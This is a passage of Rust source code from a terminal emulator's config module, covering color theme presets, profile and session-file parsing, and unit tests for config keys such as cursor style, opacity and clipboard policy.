        Value::Str(s) => Ok(s),
        _ => Err(format!("{key}: expected a quoted string")),
    }
}

fn expect_int(key: &str, v: Value) -> Result<i64, String> {
    match v {
        Value::Int(i) if i >= 0 => Ok(i),
        Value::Int(_) => Err(format!("{key}: must be non-negative")),
        _ => Err(format!("{key}: expected an integer")),
    }
}

/// A boolean: bare `true` / `false`.
fn expect_bool(key: &str, v: Value) -> Result<bool, String> {
    match v {
        Value::Bool(b) => Ok(b),
        _ => Err(format!("{key}: expected true or false")),
    }
}

/// A cursor shape name: block / underline / bar (with common aliases).
fn parse_cursor_shape(s: &str) -> Result<CursorShape, String> {
    match s.to_ascii_lowercase().as_str() {
        "block" => Ok(CursorShape::Block),
        "underline" | "underscore" => Ok(CursorShape::Underline),
        "bar" | "beam" | "ibeam" | "i-beam" | "line" | "vertical" => Ok(CursorShape::Bar),
        _ => Err(format!("unknown cursor_style `{s}` (block, underline, or bar)")),
    }
}

/// A window dimension: a positive integer that fits a `u16`.
fn expect_dim(key: &str, v: Value) -> Result<u16, String> {
    match v {
        Value::Int(i) if (1..=u16::MAX as i64).contains(&i) => Ok(i as u16),
        Value::Int(i) => Err(format!("{key}: {i} out of range (1-65535)")),
        _ => Err(format!("{key}: expected an integer")),
    }
}

/// A color: `"#RRGGBB"` or `"RRGGBB"`.
fn expect_color(key: &str, v: Value) -> Result<u32, String> {
    let Value::Str(s) = v else {
        return Err(format!("{key}: expected a quoted \"#RRGGBB\" string"));
    };
    let hex = s.strip_prefix('#').unwrap_or(&s);
    if hex.len() == 6
        && let Ok(rgb) = u32::from_str_radix(hex, 16)
    {
        return Ok(rgb);
    }
    Err(format!("{key}: `{s}` is not #RRGGBB"))
}

/// Built-in theme preset names, in the order the settings page cycles them
/// (the first being the default). The source of truth for both [`preset`]
/// resolution and the unknown-theme warning.
pub const PRESETS: &[&str] = &[
    "default", "gruvbox-dark", "dracula", "solarized-dark", "solarized-light", "nord", "one-dark",
    "catppuccin-mocha", "catppuccin-latte", "tokyo-night", "tokyo-night-storm", "monokai",
    "rose-pine", "github-dark", "kanagawa",
];

/// A built-in theme preset by (case/sep-insensitive) name, or `None`. Colors
/// are the published palettes of each scheme. `theme = "name"` seeds the whole
/// [`Theme`]; explicit `[colors]` keys still override individual entries when
/// they appear after it in the file.
pub fn preset(name: &str) -> Option<Theme> {
    let key = name.to_ascii_lowercase().replace(['-', '_', ' '], "");
    let t = |fg, bg, cursor, palette16| Theme { fg, bg, cursor, palette16 };
    Some(match key.as_str() {
        "default" => Theme::default(),
        "gruvboxdark" | "gruvbox" => t(
            0xebdbb2,
            0x282828,
            0xebdbb2,
            [
                0x282828, 0xcc241d, 0x98971a, 0xd79921, 0x458588, 0xb16286, 0x689d6a, 0xa89984,
                0x928374, 0xfb4934, 0xb8bb26, 0xfabd2f, 0x83a598, 0xd3869b, 0x8ec07c, 0xebdbb2,
            ],
        ),
        "dracula" => t(
            0xf8f8f2,
            0x282a36,
            0xf8f8f2,
            [
                0x21222c, 0xff5555, 0x50fa7b, 0xf1fa8c, 0xbd93f9, 0xff79c6, 0x8be9fd, 0xf8f8f2,
                0x6272a4, 0xff6e6e, 0x69ff94, 0xffffa5, 0xd6acff, 0xff92df, 0xa4ffff, 0xffffff,
            ],
        ),
        "solarizeddark" | "solarized" => t(
            0x839496,
            0x002b36,
            0x839496,
            [
                0x073642, 0xdc322f, 0x859900, 0xb58900, 0x268bd2, 0xd33682, 0x2aa198, 0xeee8d5,
                0x002b36, 0xcb4b16, 0x586e75, 0x657b83, 0x839496, 0x6c71c4, 0x93a1a1, 0xfdf6e3,
            ],
        ),
        "solarizedlight" => t(
            0x657b83,
            0xfdf6e3,
            0x657b83,
            [
                0x073642, 0xdc322f, 0x859900, 0xb58900, 0x268bd2, 0xd33682, 0x2aa198, 0xeee8d5,
                0x002b36, 0xcb4b16, 0x586e75, 0x657b83, 0x839496, 0x6c71c4, 0x93a1a1, 0xfdf6e3,
            ],
        ),
        "nord" => t(
            0xd8dee9,
            0x2e3440,
            0xd8dee9,
            [
                0x3b4252, 0xbf616a, 0xa3be8c, 0xebcb8b, 0x81a1c1, 0xb48ead, 0x88c0d0, 0xe5e9f0,
                0x4c566a, 0xbf616a, 0xa3be8c, 0xebcb8b, 0x81a1c1, 0xb48ead, 0x8fbcbb, 0xeceff4,
            ],
        ),
        "onedark" | "one" => t(
            0xabb2bf,
            0x282c34,
            0x528bff,
            [
                0x282c34, 0xe06c75, 0x98c379, 0xe5c07b, 0x61afef, 0xc678dd, 0x56b6c2, 0xabb2bf,
                0x5c6370, 0xe06c75, 0x98c379, 0xe5c07b, 0x61afef, 0xc678dd, 0x56b6c2, 0xffffff,
            ],
        ),
        "catppuccinmocha" | "catppuccin" => t(
            0xcdd6f4,
            0x1e1e2e,
            0xf5e0dc,
            [
                0x45475a, 0xf38ba8, 0xa6e3a1, 0xf9e2af, 0x89b4fa, 0xf5c2e7, 0x94e2d5, 0xbac2de,
                0x585b70, 0xf38ba8, 0xa6e3a1, 0xf9e2af, 0x89b4fa, 0xf5c2e7, 0x94e2d5, 0xa6adc8,
            ],
        ),
        "catppuccinlatte" => t(
            0x4c4f69,
            0xeff1f5,
            0xdc8a78,
            [
                0x5c5f77, 0xd20f39, 0x40a02b, 0xdf8e1d, 0x1e66f5, 0xea76cb, 0x179299, 0xacb0be,
                0x6c6f85, 0xd20f39, 0x40a02b, 0xdf8e1d, 0x1e66f5, 0xea76cb, 0x179299, 0xbcc0cc,
            ],
        ),
        "tokyonight" => t(
            0xc0caf5,
            0x1a1b26,
            0xc0caf5,
            [
                0x15161e, 0xf7768e, 0x9ece6a, 0xe0af68, 0x7aa2f7, 0xbb9af7, 0x7dcfff, 0xa9b1d6,
                0x414868, 0xf7768e, 0x9ece6a, 0xe0af68, 0x7aa2f7, 0xbb9af7, 0x7dcfff, 0xc0caf5,
            ],
        ),
        "tokyonightstorm" => t(
            0xc0caf5,
            0x24283b,
            0xc0caf5,
            [
                0x1d202f, 0xf7768e, 0x9ece6a, 0xe0af68, 0x7aa2f7, 0xbb9af7, 0x7dcfff, 0xa9b1d6,
                0x414868, 0xf7768e, 0x9ece6a, 0xe0af68, 0x7aa2f7, 0xbb9af7, 0x7dcfff, 0xc0caf5,
            ],
        ),
        "monokai" => t(
            0xf8f8f2,
            0x272822,
            0xf8f8f2,
            [
                0x272822, 0xf92672, 0xa6e22e, 0xf4bf75, 0x66d9ef, 0xae81ff, 0xa1efe4, 0xf8f8f2,
                0x75715e, 0xf92672, 0xa6e22e, 0xf4bf75, 0x66d9ef, 0xae81ff, 0xa1efe4, 0xf9f8f5,
            ],
        ),
        "rosepine" => t(
            0xe0def4,
            0x191724,
            0xe0def4,
            [
                0x26233a, 0xeb6f92, 0x31748f, 0xf6c177, 0x9ccfd8, 0xc4a7e7, 0xebbcba, 0xe0def4,
                0x6e6a86, 0xeb6f92, 0x31748f, 0xf6c177, 0x9ccfd8, 0xc4a7e7, 0xebbcba, 0xe0def4,
            ],
        ),
        "githubdark" | "github" => t(
            0xc9d1d9,
            0x0d1117,
            0x58a6ff,
            [
                0x484f58, 0xff7b72, 0x3fb950, 0xd29922, 0x58a6ff, 0xbc8cff, 0x39c5cf, 0xb1bac4,
                0x6e7681, 0xffa198, 0x56d364, 0xe3b341, 0x79c0ff, 0xd2a8ff, 0x56d4dd, 0xf0f6fc,
            ],
        ),
        "kanagawa" | "kanagawawave" => t(
            0xdcd7ba,
            0x1f1f28,
            0xc8c093,
            [
                0x090618, 0xc34043, 0x76946a, 0xc0a36e, 0x7e9cd8, 0x957fb8, 0x6a9589, 0xc8c093,
                0x727169, 0xe82424, 0x98bb6c, 0xe6c384, 0x7fb4ca, 0x938aa9, 0x7aa89f, 0xdcd7ba,
            ],
        ),
        _ => return None,
    })
}

impl Config {
    /// The named profile, if defined (case-insensitive).
    pub fn profile(&self, name: &str) -> Option<&Profile> {
        self.profiles.iter().find(|p| p.name.eq_ignore_ascii_case(name))
    }

    /// Layer the named `[profile.<name>]` bundle onto `self` (shell/cwd/theme,
    /// each only where the profile actually sets it). The single source of
    /// truth for applying `--profile`, used both for the initial CLI parse
    /// and for reapplying the same override after a live config reload —
    /// reload re-reads the file from scratch, and without reapplying the
    /// profile here, a running session's `--profile`-selected theme would
    /// silently revert to the file's top-level default on every save.
    /// Returns a warning (not applied) if `name` doesn't match any profile.
    pub fn apply_profile(&mut self, name: &str) -> Option<String> {
        match self.profile(name).cloned() {
            Some(p) => {
                if p.shell.is_some() {
                    self.shell = p.shell;
                }
                if p.cwd.is_some() {
                    self.cwd = p.cwd;
                }
                if let Some(t) = p.theme {
                    self.theme = t;
                }
                None
            }
            None => Some(format!("no profile named `{name}` in the config")),
        }
    }
}

/// Parse a session file: each `[tab]` (or `[tab.<label>]`) section starts a
/// tab, applied in order; keys are `profile`, `cwd`, `command`, and
/// `splits = "right,down,…"`. Same forgiving contract as the config file —
/// malformed lines warn and are skipped, never fatal.
pub fn load_session(path: &std::path::Path) -> (Vec<SessionTab>, Vec<String>) {
    let Ok(text) = std::fs::read_to_string(path) else {
        return (Vec::new(), vec![format!("session file {} is unreadable", path.display())]);
    };
    let mut tabs: Vec<SessionTab> = Vec::new();
    let mut warnings = Vec::new();
    let mut in_tab = false;
    for (idx, raw) in text.lines().enumerate() {
        let line = raw.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        if let Some(rest) = line.strip_prefix('[') {
            match rest.split_once(']') {
                Some((name, tail)) if tail.trim().is_empty() || tail.trim().starts_with('#') => {
                    let name = name.trim().to_ascii_lowercase();
                    in_tab = name == "tab" || name.starts_with("tab.");
                    if in_tab {
                        tabs.push(SessionTab::default());
                    } else {
                        warnings.push(format!("line {}: unknown section [{name}]", idx + 1));
                    }
                }
                _ => warnings.push(format!("line {}: malformed section header", idx + 1)),
            }
            continue;
        }
        let Some((key, rest)) = line.split_once('=') else {
            warnings.push(format!("line {}: expected `key = value`", idx + 1));
            continue;
        };
        if !in_tab {
            warnings.push(format!("line {}: key outside a [tab] section", idx + 1));
            continue;
        }
        let key = key.trim().to_ascii_lowercase().replace('-', "_");
        let value = match parse_value(rest.trim()) {
            Ok(v) => v,
            Err(e) => {
                warnings.push(format!("line {}: {} ({})", idx + 1, e, key));
                continue;
            }
        };
        let tab = tabs.last_mut().expect("in_tab implies a tab exists");
        let res: Result<(), String> = (|| {
            match key.as_str() {
                "profile" => tab.profile = Some(expect_str(&key, value)?),
                "cwd" => tab.cwd = Some(PathBuf::from(expect_str(&key, value)?)),
                "command" => tab.command = Some(expect_str(&key, value)?),
                "splits" => {
                    for part in expect_str(&key, value)?.split(',') {
                        let part = part.trim().to_ascii_lowercase();
                        match part.as_str() {
                            "right" | "down" => tab.splits.push(part),
                            "" => {}
                            other => return Err(format!("unknown split `{other}`")),
                        }
                    }
                }
                other => return Err(format!("unknown key `{other}` in [tab]")),
            }
            Ok(())
        })();
        if let Err(e) = res {
            warnings.push(format!("line {}: {}", idx + 1, e));
        }
    }
    (tabs, warnings)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn empty_and_comments_yield_defaults() {
        let (cfg, warns) = parse("# nothing\n\n   \n# more\n");
        assert_eq!(cfg, Config::default());
        assert!(warns.is_empty());
    }

    #[test]
    fn full_file_parses() {
        let text = r##"
# rusty_term config
shell = "/usr/bin/fish"   # login shell
scrollback = 5000

[window]
cols = 120
rows = 40
font = "C:\\Windows\\Fonts\\CascadiaMono.ttf"
font-size = 16.5

[colors]
foreground = "#d8d8d8"
background = "#1d1f21"
cursor = "#aeafad"
color0 = "#282a2e"
color15 = "ffffff"
"##;
        let (cfg, warns) = parse(text);
        assert_eq!(warns, Vec::<String>::new());
        assert_eq!(cfg.shell.as_deref(), Some("/usr/bin/fish"));
        assert_eq!(cfg.scrollback, Some(5000));
        assert_eq!(cfg.cols, Some(120));
        assert_eq!(cfg.rows, Some(40));
        assert_eq!(
            cfg.font.as_deref(),
            Some(std::path::Path::new("C:\\Windows\\Fonts\\CascadiaMono.ttf"))
        );
        assert_eq!(cfg.font_size, Some(16.5));
        assert_eq!(cfg.theme.fg, 0xd8d8d8);
        assert_eq!(cfg.theme.bg, 0x1d1f21);
        assert_eq!(cfg.theme.cursor, 0xaeafad);
        assert_eq!(cfg.theme.palette16[0], 0x282a2e);
        assert_eq!(cfg.theme.palette16[15], 0xffffff);
        // Untouched palette slots keep their defaults.
        assert_eq!(cfg.theme.palette16[1], Theme::default().palette16[1]);
    }

    #[test]
    fn font_size_integer_and_underscore_spelling() {
        let (cfg, warns) = parse("[window]\nfont_size = 14\n");
        assert!(warns.is_empty());
        assert_eq!(cfg.font_size, Some(14.0));
    }

    #[test]
    fn profile_sections_collect_named_bundles() {
        let (cfg, warns) = parse(
            "[profile.dev]\nshell = \"/usr/bin/fish\"\ncwd = \"/src\"\ntheme = \"nord\"\n[profile.ops]\nshell = \"/bin/bash\"\n",
        );
        assert!(warns.is_empty(), "{warns:?}");
        assert_eq!(cfg.profiles.len(), 2);
        let dev = cfg.profile("Dev").expect("case-insensitive lookup");
        assert_eq!(dev.shell.as_deref(), Some("/usr/bin/fish"));
        assert_eq!(dev.cwd.as_deref(), Some(std::path::Path::new("/src")));
        assert!(dev.theme.is_some());
        assert_eq!(cfg.profile("ops").unwrap().shell.as_deref(), Some("/bin/bash"));
        // Unknown profile keys warn without dropping the profile.
        let (cfg2, warns2) = parse("[profile.x]\nshell = \"sh\"\nbogus = 1\n");
        assert_eq!(warns2.len(), 1);
        assert_eq!(cfg2.profiles.len(), 1);
    }

    #[test]
    fn apply_profile_layers_only_the_fields_the_profile_actually_sets() {
        let (mut cfg, warns) = parse(
            "shell = \"/bin/zsh\"\ntheme = \"nord\"\n[profile.dev]\ncwd = \"/src\"\ntheme = \"gruvbox-dark\"\n",
        );
        assert!(warns.is_empty(), "{warns:?}");
        let base_shell = cfg.shell.clone();
        let base_theme = cfg.theme;

        let w = cfg.apply_profile("dev");
        assert!(w.is_none(), "{w:?}");
        // The profile didn't set `shell`, so the top-level value survives.
        assert_eq!(cfg.shell, base_shell);
        assert_eq!(cfg.cwd.as_deref(), Some(std::path::Path::new("/src")));
        // The profile's theme wins over the top-level one.
        assert_ne!(cfg.theme.bg, base_theme.bg);
    }

    #[test]
    fn apply_profile_warns_and_leaves_config_untouched_for_an_unknown_name() {
        let (mut cfg, warns) = parse("shell = \"/bin/zsh\"\n");
        assert!(warns.is_empty());
        let before = cfg.shell.clone();
        let w = cfg.apply_profile("does-not-exist");
        assert_eq!(w, Some("no profile named `does-not-exist` in the config".to_string()));
        assert_eq!(cfg.shell, before);
    }

    #[test]
    fn flag_value_reads_both_space_and_equals_forms() {
        let space = vec!["--profile".to_string(), "dev".to_string()];
        assert_eq!(flag_value(&space, "--profile"), Some("dev"));
        let eq = vec!["--profile=dev".to_string()];
        assert_eq!(flag_value(&eq, "--profile"), Some("dev"));
        let absent = vec!["--other".to_string()];
        assert_eq!(flag_value(&absent, "--profile"), None);
    }

    #[test]
    fn session_file_parses_tabs_in_order() {
        let dir = std::env::temp_dir().join(format!("rt_session_{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("s.toml");
        std::fs::write(
            &path,
            "[tab]\ncwd = \"/a\"\ncommand = \"htop -d 10\"\n[tab.logs]\nprofile = \"dev\"\nsplits = \"right, down\"\nbad = 1\n",
        )
        .unwrap();
        let (tabs, warns) = load_session(&path);
        assert_eq!(tabs.len(), 2);
        assert_eq!(tabs[0].cwd.as_deref(), Some(std::path::Path::new("/a")));
        assert_eq!(tabs[0].command.as_deref(), Some("htop -d 10"));
        assert_eq!(tabs[1].profile.as_deref(), Some("dev"));
        assert_eq!(tabs[1].splits, vec!["right", "down"]);
        assert_eq!(warns.len(), 1, "{warns:?}"); // the `bad` key
        // Unreadable file: no tabs, one warning, never fatal.
        let (none, w) = load_session(std::path::Path::new("/nonexistent/s.toml"));
        assert!(none.is_empty() && w.len() == 1);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn theme_auto_and_contrast_keys_parse() {
        let (cfg, warns) =
            parse("theme = \"auto\"\ntheme_light = \"solarized-light\"\nminimum_contrast = 4.5\n");
        assert!(warns.is_empty(), "{warns:?}");
        assert!(cfg.theme_auto);
        assert!(cfg.theme_light.is_some());
        assert_eq!(cfg.minimum_contrast, Some(4.5));
        // A named theme still resolves as before, without setting auto.
        let (cfg2, _) = parse("theme = \"nord\"\n");
        assert!(!cfg2.theme_auto);
        // Out-of-range contrast clamps; integers accepted.
        let (cfg3, _) = parse("minimum_contrast = 99\n");
        assert_eq!(cfg3.minimum_contrast, Some(21.0));
    }

    #[test]
    fn bell_and_command_notify_keys_parse() {
        let (cfg, warns) = parse("bell = false\ncommand_notify_secs = 30\n");
        assert!(warns.is_empty(), "{warns:?}");
        assert_eq!(cfg.bell, Some(false));
        assert_eq!(cfg.command_notify_secs, Some(30));
        // Unset by default (the front-end defaults: bell on, 10s threshold).
        let (cfg2, _) = parse("");
        assert_eq!(cfg2.bell, None);
        assert_eq!(cfg2.command_notify_secs, None);
        // A malformed value warns and is skipped, never fatal.
        let (cfg3, warns3) = parse("command_notify_secs = \"soon\"\n");
        assert_eq!(cfg3.command_notify_secs, None);
        assert_eq!(warns3.len(), 1);
    }

    #[test]
    fn ligatures_key_parses() {
        let (cfg, warns) = parse("[window]\nligatures = false\n");
        assert!(warns.is_empty(), "{warns:?}");
        assert_eq!(cfg.ligatures, Some(false));
        // Unset by default (the front-end treats absence as enabled).
        let (cfg2, _) = parse("[window]\ncols = 80\n");
        assert_eq!(cfg2.ligatures, None);
    }

    #[test]
    fn unknown_keys_warn_but_do_not_fail() {
        let (cfg, warns) = parse("shell = \"sh\"\nbogus = 1\n[weird]\nx = 2\n");
        assert_eq!(cfg.shell.as_deref(), Some("sh"));
        assert_eq!(warns.len(), 2);
        assert!(warns[0].contains("unknown key `bogus`"));
        assert!(warns[1].contains("[weird]"));
    }

    #[test]
    fn cursor_style_and_blink_parse() {
        let (cfg, warns) = parse("cursor_style = \"bar\"\ncursor_blink = true\n");
        assert!(warns.is_empty(), "{warns:?}");
        assert_eq!(cfg.cursor_style, Some(CursorShape::Bar));
        assert_eq!(cfg.cursor_blink, Some(true));
    }

    #[test]
    fn title_key_parses() {
        let (cfg, warns) = parse("title = \"naner: dev\"\n");
        assert!(warns.is_empty(), "{warns:?}");
        assert_eq!(cfg.title.as_deref(), Some("naner: dev"));
    }

    #[test]
    fn launch_mode_key_parses_and_warns_on_unknown() {
        let (cfg, warns) = parse("[window]\nlaunch_mode = \"maximized\"\n");
        assert!(warns.is_empty(), "{warns:?}");
        assert_eq!(cfg.launch_mode, Some(LaunchMode::Maximized));
        let (cfg2, warns2) = parse("[window]\nlaunch_mode = \"full\"\n");
        assert!(warns2.is_empty(), "{warns2:?}");
        assert_eq!(cfg2.launch_mode, Some(LaunchMode::Fullscreen));
        let (cfg3, warns3) = parse("[window]\nlaunch_mode = \"bogus\"\n");
        assert_eq!(cfg3.launch_mode, None);
        assert_eq!(warns3.len(), 1);
    }

    #[test]
    fn opacity_key_parses_int_and_float_and_rejects_out_of_range() {
        let (cfg, warns) = parse("[window]\nopacity = 0.85\n");
        assert!(warns.is_empty(), "{warns:?}");
        assert_eq!(cfg.opacity, Some(0.85));
        let (cfg2, warns2) = parse("[window]\nopacity = 1\n");
        assert!(warns2.is_empty(), "{warns2:?}");
        assert_eq!(cfg2.opacity, Some(1.0));
        let (cfg3, warns3) = parse("[window]\nopacity = 1.5\n");
        assert_eq!(cfg3.opacity, None);
        assert_eq!(warns3.len(), 1);
        let (cfg4, warns4) = parse("[window]\nopacity = -0.1\n");
        assert_eq!(cfg4.opacity, None);
        assert_eq!(warns4.len(), 1);
    }

    #[test]
    fn bidi_key_parses_auto_off_and_rejects_junk() {
        assert_eq!(parse("bidi = \"auto\"\n").0.bidi, Some(true));
        assert_eq!(parse("bidi = \"off\"\n").0.bidi, Some(false));
        let (cfg, warns) = parse("bidi = \"sideways\"\n");
        assert_eq!(cfg.bidi, None);
        assert_eq!(warns.len(), 1);
    }

    #[test]
    fn cursor_trail_key_parses() {
        let (cfg, warns) = parse("cursor_trail = true\n");
        assert!(warns.is_empty(), "{warns:?}");
        assert_eq!(cfg.cursor_trail, Some(true));
        assert_eq!(parse("").0.cursor_trail, None); // default-off at the window
    }

    #[test]
    fn copy_html_key_parses() {
        let (cfg, warns) = parse("copy_html = false\n");
        assert!(warns.is_empty(), "{warns:?}");
        assert_eq!(cfg.copy_html, Some(false));
        let (cfg2, _) = parse("");
        assert_eq!(cfg2.copy_html, None); // default-on at the copy site
    }

    #[test]
    fn clipboard_key_parses_all_policies_and_rejects_unknown() {
        let (cfg, warns) = parse("clipboard = \"off\"\n");
        assert!(warns.is_empty(), "{warns:?}");
        assert_eq!(cfg.clipboard, Some(ClipboardPolicy::Off));
        let (cfg2, warns2) = parse("clipboard = \"write-only\"\n");
        assert!(warns2.is_empty(), "{warns2:?}");
        assert_eq!(cfg2.clipboard, Some(ClipboardPolicy::WriteOnly));
        let (cfg3, warns3) = parse("clipboard = \"read-write\"\n");
        assert!(warns3.is_empty(), "{warns3:?}");
        assert_eq!(cfg3.clipboard, Some(ClipboardPolicy::ReadWrite));
        let (cfg4, warns4) = parse("clipboard = \"bogus\"\n");
        assert_eq!(cfg4.clipboard, None);
        assert_eq!(warns4.len(), 1);
        let (cfg5, _) = parse("");
        assert_eq!(cfg5.clipboard, None); // default is write-only at the consuming site
    }

    #[test]
    fn quake_height_parses_and_rejects_out_of_range() {
        let (cfg, warns) = parse("[window]\nquake_height = 0.3\n");
        assert!(warns.is_empty(), "{warns:?}");
        assert_eq!(cfg.quake_height, Some(0.3));
        let (cfg2, warns2) = parse("[window]\nquake_height = 1\n");
        assert!(warns2.is_empty(), "{warns2:?}");
        assert_eq!(cfg2.quake_height, Some(1.0));
        // Out of range (a sliver of a window, or taller than the monitor).
        let (cfg3, warns3) = parse("[window]\nquake_height = 0.05\n");
        assert_eq!(cfg3.quake_height, None);
        assert_eq!(warns3.len(), 1);
        let (cfg4, warns4) = parse("[window]\nquake_height = 2\n");
        assert_eq!(cfg4.quake_height, None);
        assert_eq!(warns4.len(), 1);
    }

    #[test]
    fn cursor_style_aliases_and_bad_values_warn() {
        // "beam" is an alias for the bar/I-beam shape.
        let (cfg, _) = parse("cursor_style = \"beam\"\n");
        assert_eq!(cfg.cursor_style, Some(CursorShape::Bar));
        // An unknown shape and a non-boolean blink each warn and are skipped.
        let (cfg2, warns) = parse("cursor_style = \"triangle\"\ncursor_blink = maybe\n");
        assert_eq!(cfg2.cursor_style, None);
        assert_eq!(cfg2.cursor_blink, None);
        assert_eq!(warns.len(), 2);
    }

    #[test]
    fn keys_section_rebinds_actions() {
        use crate::keymap::{Action, Chord, Key};
        let (cfg, warns) = parse("[keys]\ncopy = \"Ctrl+Alt+C\"\nnew_tab = \"Ctrl+Shift+N\"\n");
        assert!(warns.is_empty(), "{warns:?}");
        assert_eq!(cfg.keys.action(Chord::new(true, false, true, Key::Char('c'))), Some(Action::Copy));
        assert_eq!(cfg.keys.action(Chord::new(true, true, false, Key::Char('n'))), Some(Action::NewTab));
        // The rebound action vacated its default chord.
        assert_eq!(cfg.keys.action(Chord::new(true, true, false, Key::Char('c'))), None);
        // Untouched defaults still resolve.
        assert_eq!(cfg.keys.action(Chord::new(true, true, false, Key::Char('v'))), Some(Action::Paste));
    }

    #[test]
    fn keys_section_warns_on_bad_action_or_chord() {
        use crate::keymap::{Action, Chord, Key};
        let (cfg, warns) = parse("[keys]\nbogus = \"Ctrl+C\"\ncopy = \"Ctrl+Nope\"\n");
        assert_eq!(warns.len(), 2); // unknown action + malformed chord
        // Both lines were rejected, so the defaults are intact.
        assert_eq!(cfg.keys.action(Chord::new(true, true, false, Key::Char('c'))), Some(Action::Copy));
    }

    #[test]
    fn malformed_values_warn_and_skip() {
        let (cfg, warns) = parse(
            "scrollback = \"lots\"\n\
             [window]\ncols = 0\nfont-size = 1000\n\
             [colors]\nforeground = \"#12345\"\ncolor16 = \"#000000\"\nbackground = 7\n",
        );
        assert_eq!(cfg, Config::default());
        assert_eq!(warns.len(), 6);
    }

    #[test]
    fn string_escapes_and_unterminated() {
        let (cfg, warns) = parse("shell = \"C:\\\\bin\\\\z sh\\\"q\\\"\"\n");
        assert!(warns.is_empty());
        assert_eq!(cfg.shell.as_deref(), Some("C:\\bin\\z sh\"q\""));
        let (_, warns) = parse("shell = \"oops\n");
        assert_eq!(warns.len(), 1);
        assert!(warns[0].contains("unterminated"));
    }

    #[test]
    fn garbage_lines_warn() {
        let (_, warns) = parse("just some words\n[unclosed\n");
        assert_eq!(warns.len(), 2);
    }

    #[test]
    fn cli_flag_resolves_explicit_path() {
        let args = vec!["--config".to_string(), "x.toml".to_string()];
        assert_eq!(resolve_path(&args), (Some((PathBuf::from("x.toml"), true)), Vec::new()));
        let args = vec!["--config=y.toml".to_string()];
        assert_eq!(resolve_path(&args), (Some((PathBuf::from("y.toml"), true)), Vec::new()));
    }

    #[test]
    fn valueless_config_flag_warns_and_falls_back_to_discovery() {
        // `--config` with nothing after it used to `return None` immediately,
        // skipping the `$RUSTY_TERM_CONFIG` / platform-default fallbacks and
        // silently leaving the user's default config unloaded. It must warn
        // and still try those instead.
        let args = vec!["--config".to_string()];
        let (resolved, warnings) = resolve_path(&args);
        assert_eq!(warnings.len(), 1, "{warnings:?}");
        assert!(warnings[0].contains("--config"), "{warnings:?}");
        // With no env var and (most likely) no default config file present in
        // a test environment, this resolves to the platform-default path
        // absent — never the old unconditional `None` from the CLI branch
        // alone. We can't assert the exact platform-default result here
        // without touching the real filesystem/env, so just confirm the
        // warning fired and the function didn't panic reaching this far.
        let _ = resolved;
    }

    #[test]
    fn load_missing_explicit_file_warns() {
        let args = vec!["--config".into(), "definitely/not/here.toml".into()];
        let (cfg, warns) = Config::load(&args);
        assert_eq!(cfg, Config::default());
        assert_eq!(warns.len(), 1);
    }

    #[test]
    fn theme_preset_seeds_colors() {
        let (cfg, warns) = parse("theme = \"gruvbox-dark\"\n");
        assert!(warns.is_empty());
        assert_eq!(cfg.theme.bg, 0x282828);
        assert_eq!(cfg.theme.fg, 0xebdbb2);
        assert_eq!(cfg.theme.palette16[1], 0xcc241d, "gruvbox red");
        // Name normalization: case and separators don't matter.
        assert_eq!(preset("Gruvbox_Dark"), preset("gruvbox-dark"));
        assert_eq!(preset("SOLARIZED LIGHT"), preset("solarized-light"));
        assert!(preset("not-a-theme").is_none());
    }

    #[test]
    fn every_preset_resolves_with_signature_colors() {
        // (name, bg, fg, one signature ANSI slot) per preset — guards against
        // a palette row being pasted under the wrong name.
        let expect: &[(&str, u32, u32, usize, u32)] = &[
            ("default", 0x000000, 0xFFFFFF, 1, 0x800000),
            ("gruvbox-dark", 0x282828, 0xebdbb2, 2, 0x98971a),
            ("dracula", 0x282a36, 0xf8f8f2, 5, 0xff79c6),
            ("solarized-dark", 0x002b36, 0x839496, 4, 0x268bd2),
            ("solarized-light", 0xfdf6e3, 0x657b83, 4, 0x268bd2),
            ("nord", 0x2e3440, 0xd8dee9, 6, 0x88c0d0),
            ("one-dark", 0x282c34, 0xabb2bf, 1, 0xe06c75),
            ("catppuccin-mocha", 0x1e1e2e, 0xcdd6f4, 4, 0x89b4fa),
            ("catppuccin-latte", 0xeff1f5, 0x4c4f69, 1, 0xd20f39),
            ("tokyo-night", 0x1a1b26, 0xc0caf5, 4, 0x7aa2f7),
            ("tokyo-night-storm", 0x24283b, 0xc0caf5, 4, 0x7aa2f7),
            ("monokai", 0x272822, 0xf8f8f2, 1, 0xf92672),
            ("rose-pine", 0x191724, 0xe0def4, 1, 0xeb6f92),
            ("github-dark", 0x0d1117, 0xc9d1d9, 2, 0x3fb950),
            ("kanagawa", 0x1f1f28, 0xdcd7ba, 5, 0x957fb8),
        ];
        for &(name, bg, fg, slot, color) in expect {
            let theme = preset(name).unwrap_or_else(|| panic!("preset `{name}` missing"));
            assert_eq!(theme.bg, bg, "{name} bg");
            assert_eq!(theme.fg, fg, "{name} fg");
            assert_eq!(theme.palette16[slot], color, "{name} palette16[{slot}]");
        }
        // Every advertised preset must actually resolve.
        for &name in PRESETS {
            assert!(preset(name).is_some(), "advertised preset `{name}` missing");
        }
    }

    #[test]
    fn preset_aliases_resolve() {
        assert_eq!(preset("catppuccin"), preset("catppuccin-mocha"));
        assert_eq!(preset("github"), preset("github-dark"));
        assert_eq!(preset("kanagawa-wave"), preset("kanagawa"));
        assert_eq!(preset("gruvbox"), preset("gruvbox-dark"));
        assert_eq!(preset("solarized"), preset("solarized-dark"));
        assert_eq!(preset("one"), preset("one-dark"));
    }

    #[test]
    fn explicit_colors_override_preset() {
        // [colors] after `theme = ...` overrides individual entries.
        let (cfg, warns) = parse("theme = \"dracula\"\n[colors]\nbackground = \"#000000\"\n");
        assert!(warns.is_empty());
        assert_eq!(cfg.theme.bg, 0x000000, "explicit bg wins");
        assert_eq!(cfg.theme.fg, 0xf8f8f2, "dracula fg kept");
        assert_eq!(cfg.theme.palette16[4], 0xbd93f9, "dracula purple kept");
    }

    #[test]
    fn unknown_theme_warns_and_keeps_defaults() {
        let (cfg, warns) = parse("theme = \"vaporwave\"\n");
        assert_eq!(cfg.theme, Theme::default());
        assert_eq!(warns.len(), 1);
        assert!(warns[0].contains("unknown theme"));
    }

    #[test]
    fn toml_string_escapes_path_separators() {
        assert_eq!(toml_string(r"C:\PowerShell\pwsh.exe"), r#""C:\\PowerShell\\pwsh.exe""#);
        assert_eq!(toml_string("a\"b"), r#""a\"b""#);
    }

    #[test]
    fn upsert_replaces_existing_top_level_key_keeping_the_rest() {
